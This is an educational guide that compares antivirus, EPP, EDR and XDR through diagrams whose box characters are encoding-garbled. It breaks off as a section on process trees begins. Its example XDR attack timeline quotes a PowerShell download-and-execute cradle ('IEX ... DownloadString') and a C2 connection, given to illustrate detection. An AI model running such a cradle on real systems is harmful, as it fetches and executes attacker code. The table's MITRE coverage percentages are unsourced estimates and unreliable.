# Antivirus vs EPP vs EDR vs XDR

The Evolution of Endpoint Security
```
Timeline of Endpoint Security Evolution
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

1990s              2000s              2010s              2020s
  â”‚                  â”‚                  â”‚                  â”‚
  â–¼                  â–¼                  â–¼                  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   AV    â”‚â”€â”€â”€â–¶â”‚    EPP    â”‚â”€â”€â”€â–¶â”‚    EDR    â”‚â”€â”€â”€â–¶â”‚    XDR    â”‚
â”‚Signatureâ”‚    â”‚ Heuristic â”‚    â”‚ Behavioralâ”‚    â”‚ Unified   â”‚
â”‚ Based   â”‚    â”‚  + HIPS   â”‚    â”‚ Analysis  â”‚    â”‚ Platform  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     â”‚              â”‚                 â”‚                â”‚
   Known        Known +          Unknown +         Everything +
   Malware     Suspicious        Living off        Correlation
     Only      Patterns          the Land           Across All
```


#### Comparison

| Capability           | Traditional AV   | EPP                     | EDR                     | XDR                        |
| :------------------- | :--------------- | :---------------------- | :---------------------- | :------------------------- |
| **Detection Method** | Signatures       | Signatures + Heuristics | Behavioral + ML         | Cross-platform correlation |
| **Response**         | Block/Quarantine | Block/Quarantine        | Investigate + Respond   | Orchestrated Response      |
| **Visibility**       | File-level       | File + Process          | Full endpoint telemetry | Organization-wide          |
| **Historical Data**  | None             | Minimal                 | Days-Weeks              | Months                     |
| **Threat Hunting**   | âŒ                | Limited                 | âœ… Full                  | âœ… Extended                 |
| **Investigation**    | Alert only       | Basic                   | Deep forensics          | Cross-domain               |
| **MITRE Coverage**   | ~10%             | ~30%                    | ~70%                    | ~85%+                      |

## Traditional Antivirus (AV)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    SIGNATURE-BASED AV                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                              â”‚
â”‚   File Downloaded     Signature Database    Decision        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚   â”‚ malware.exe â”‚â”€â”€â”€â”€â–¶â”‚ Hash: a1b2c3  â”‚â”€â”€â”€â–¶â”‚  MATCH?   â”‚   â”‚
â”‚   â”‚ Hash: a1b2c3â”‚     â”‚ Hash: d4e5f6  â”‚    â”‚           â”‚   â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚ Hash: g7h8i9  â”‚    â”‚ Yesâ†’Block â”‚   â”‚
â”‚                       â”‚ ...millions   â”‚    â”‚ Noâ†’Allow  â”‚   â”‚
â”‚                       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                              â”‚
â”‚   Limitations:                                               â”‚
â”‚   â€¢ Zero-day malware passes undetected                      â”‚
â”‚   â€¢ Polymorphic malware changes hash each time              â”‚
â”‚   â€¢ Fileless attacks bypass completely                       â”‚
â”‚   â€¢ Daily signature updates required                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## Endpoint Protection Platform (EPP)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                         EPP ARCHITECTURE                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚   â”‚                    EPP Agent                                 â”‚     â”‚
â”‚   â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚     â”‚
â”‚   â”‚  â”‚  Signature   â”‚  Heuristics   â”‚    HIPS/Firewall        â”‚ â”‚     â”‚
â”‚   â”‚  â”‚   Engine     â”‚    Engine     â”‚                         â”‚ â”‚     â”‚
â”‚   â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚     â”‚
â”‚   â”‚  â”‚ â€¢ Known      â”‚ â€¢ Suspicious  â”‚ â€¢ Block network         â”‚ â”‚     â”‚
â”‚   â”‚  â”‚   malware    â”‚   patterns    â”‚   connections           â”‚ â”‚     â”‚
â”‚   â”‚  â”‚ â€¢ Hash       â”‚ â€¢ Packing     â”‚ â€¢ Prevent exploit       â”‚ â”‚     â”‚
â”‚   â”‚  â”‚   matching   â”‚   detection   â”‚   techniques            â”‚ â”‚     â”‚
â”‚   â”‚  â”‚ â€¢ YARA rules â”‚ â€¢ Emulation   â”‚ â€¢ Device control        â”‚ â”‚     â”‚
â”‚   â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚     â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â”‚                                                                        â”‚
â”‚   Improvements over AV:                                                â”‚
â”‚   âœ“ Catches packed/obfuscated malware through emulation               â”‚
â”‚   âœ“ Blocks exploit techniques (DEP, ASLR enforcement)                 â”‚
â”‚   âœ“ Host-based firewall integration                                   â”‚
â”‚   âœ— Still primarily prevention-focused                                â”‚
â”‚   âœ— Limited visibility into what happened                            â”‚
â”‚   âœ— No threat hunting capability                                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```


## Endpoint Detection & Response (EDR)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                           EDR ARCHITECTURE                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚   â”‚                        ENDPOINT AGENT                                â”‚  â”‚
â”‚   â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
â”‚   â”‚  â”‚  Process    â”‚ â”‚  Network    â”‚ â”‚   File      â”‚ â”‚   Registry   â”‚  â”‚  â”‚
â”‚   â”‚  â”‚  Telemetry  â”‚ â”‚  Telemetry  â”‚ â”‚  Telemetry  â”‚ â”‚   Telemetry  â”‚  â”‚  â”‚
â”‚   â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
â”‚   â”‚         â”‚               â”‚               â”‚                â”‚          â”‚  â”‚
â”‚   â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â”‚  â”‚
â”‚   â”‚                                 â”‚                                    â”‚  â”‚
â”‚   â”‚                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                      â”‚  â”‚
â”‚   â”‚                    â”‚   Behavioral Engine     â”‚                      â”‚  â”‚
â”‚   â”‚                    â”‚   â€¢ ML Models           â”‚                      â”‚  â”‚
â”‚   â”‚                    â”‚   â€¢ IOA Detection       â”‚                      â”‚  â”‚
â”‚   â”‚                    â”‚   â€¢ Anomaly Detection   â”‚                      â”‚  â”‚
â”‚   â”‚                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                      â”‚  â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                      â”‚                                      â”‚
â”‚                          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                         â”‚
â”‚                          â”‚     EDR CONSOLE       â”‚                         â”‚
â”‚                          â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚                         â”‚
â”‚                          â”‚  â”‚ â€¢ Alert Triage  â”‚  â”‚                         â”‚
â”‚                          â”‚  â”‚ â€¢ Investigation â”‚  â”‚                         â”‚
â”‚                          â”‚  â”‚ â€¢ Threat Hunt   â”‚  â”‚                         â”‚
â”‚                          â”‚  â”‚ â€¢ Response      â”‚  â”‚                         â”‚
â”‚                          â”‚  â”‚ â€¢ Forensics     â”‚  â”‚                         â”‚
â”‚                          â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚                         â”‚
â”‚                          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                         â”‚
â”‚                                                                             â”‚
â”‚   Key EDR Capabilities:                                                    â”‚
â”‚   âœ“ Continuous recording of endpoint activity                             â”‚
â”‚   âœ“ Behavioral detection of unknown threats                               â”‚
â”‚   âœ“ Remote investigation and forensics                                    â”‚
â”‚   âœ“ Threat hunting with historical data                                   â”‚
â”‚   âœ“ Automated and manual response actions                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```


### What EDR Records (Telemetry):
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        EDR TELEMETRY TYPES                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                        â”‚
â”‚  PROCESS EVENTS          FILE EVENTS             NETWORK EVENTS        â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€       â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€         â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€     â”‚
â”‚  â€¢ Process creation      â€¢ File create           â€¢ DNS queries         â”‚
â”‚  â€¢ Process termination   â€¢ File modify           â€¢ TCP connections     â”‚
â”‚  â€¢ Command line args     â€¢ File delete           â€¢ HTTP/HTTPS          â”‚
â”‚  â€¢ Parent-child          â€¢ File rename           â€¢ Suspicious ports    â”‚
â”‚  â€¢ User context          â€¢ File permissions      â€¢ Data volume         â”‚
â”‚  â€¢ Loaded DLLs           â€¢ File hash             â€¢ Geolocation         â”‚
â”‚                                                                        â”‚
â”‚  REGISTRY EVENTS         MEMORY EVENTS           AUTHENTICATION        â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€       â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€         â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€     â”‚
â”‚  â€¢ Key creation          â€¢ Injection attempts    â€¢ Logon events        â”‚
â”‚  â€¢ Value modification    â€¢ Memory protection     â€¢ Privilege use       â”‚
â”‚  â€¢ Autorun changes       â€¢ Suspicious allocs     â€¢ Token manipulation  â”‚
â”‚  â€¢ Persistence keys      â€¢ Code caves            â€¢ Credential access   â”‚
â”‚                                                                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```


## Extended Detection & Response (XDR)
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                            XDR PLATFORM                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚
â”‚     â”‚Endpointsâ”‚  â”‚ Network â”‚  â”‚  Email  â”‚  â”‚  Cloud  â”‚  â”‚Identity â”‚       â”‚
â”‚     â”‚  (EDR)  â”‚  â”‚  (NDR)  â”‚  â”‚Security â”‚  â”‚Workloadsâ”‚  â”‚  (IAM)  â”‚       â”‚
â”‚     â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜       â”‚
â”‚          â”‚            â”‚            â”‚            â”‚            â”‚             â”‚
â”‚          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜             â”‚
â”‚                                   â”‚                                        â”‚
â”‚                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                        â”‚
â”‚                    â”‚    XDR CORRELATION ENGINE   â”‚                        â”‚
â”‚                    â”‚                             â”‚                        â”‚
â”‚                    â”‚  â€¢ Cross-domain detection   â”‚                        â”‚
â”‚                    â”‚  â€¢ Attack chain analysis    â”‚                        â”‚
â”‚                    â”‚  â€¢ Unified investigation    â”‚                        â”‚
â”‚                    â”‚  â€¢ Orchestrated response    â”‚                        â”‚
â”‚                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                        â”‚
â”‚                                   â”‚                                        â”‚
â”‚                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                        â”‚
â”‚                    â”‚      UNIFIED CONSOLE        â”‚                        â”‚
â”‚                    â”‚   Single pane of glass for  â”‚                        â”‚
â”‚                    â”‚   complete attack visibilityâ”‚                        â”‚
â”‚                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                        â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### XDR Correlation Example:
```
Attack Timeline - XDR Correlation View
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

T+0min â”€â”€â”€ EMAIL SECURITY â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
           â”‚ User: john.smith@company.com
           â”‚ Subject: "Invoice_2024.pdf"
           â”‚ Attachment: Invoice.pdf.exe (detected as suspicious)
           â”‚ Action: Quarantined, but user clicked before quarantine
           â–¼
T+2min â”€â”€â”€ EDR (Endpoint) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
           â”‚ Workstation: DESKTOP-JS001
           â”‚ Process: Invoice.pdf.exe spawned PowerShell
           â”‚ Command: IEX (New-Object Net.WebClient).DownloadString(...)
           â”‚ Action: Suspicious behavior detected
           â–¼
T+3min â”€â”€â”€ NDR (Network) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
           â”‚ Connection: DESKTOP-JS001 â†’ 45.33.32.156:443
           â”‚ Domain: update-service.xyz (DGA detected)
           â”‚ Bytes Out: 2.3MB (abnormal for workstation)
           â”‚ Action: C2 communication suspected
           â–¼
T+5min â”€â”€â”€ IDENTITY (Azure AD) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
           â”‚ User: john.smith attempted access to SharePoint
           â”‚ Anomaly: First access to Finance folder
           â”‚ Risk Score: Elevated due to concurrent EDR alert
           â”‚ Action: Step-up authentication required
           â–¼
T+8min â”€â”€â”€ XDR CORRELATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
           â”‚ 
           â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
           â”‚ â”‚  CRITICAL INCIDENT: Active Breach Detected              â”‚
           â”‚ â”‚                                                         â”‚
           â”‚ â”‚  Kill Chain Stage: Execution â†’ C2 â†’ Lateral Movement   â”‚
           â”‚ â”‚  Confidence: 98%                                        â”‚
           â”‚ â”‚  Affected Assets: DESKTOP-JS001, john.smith account    â”‚
           â”‚ â”‚                                                         â”‚
           â”‚ â”‚  Automated Response Actions:                            â”‚
           â”‚ â”‚  âœ“ Endpoint isolated from network                      â”‚
           â”‚ â”‚  âœ“ User session terminated                             â”‚
           â”‚ â”‚  âœ“ MFA required for re-authentication                  â”‚
           â”‚ â”‚  âœ“ Threat intel shared with email gateway              â”‚
           â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â–¼
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

___

# Alert Triage: Analyzing Process Trees
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      PROCESS TREE FUNDAMENTALS                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  NORMAL WINDOWS BOOT PROCESS TREE:                                          â”‚
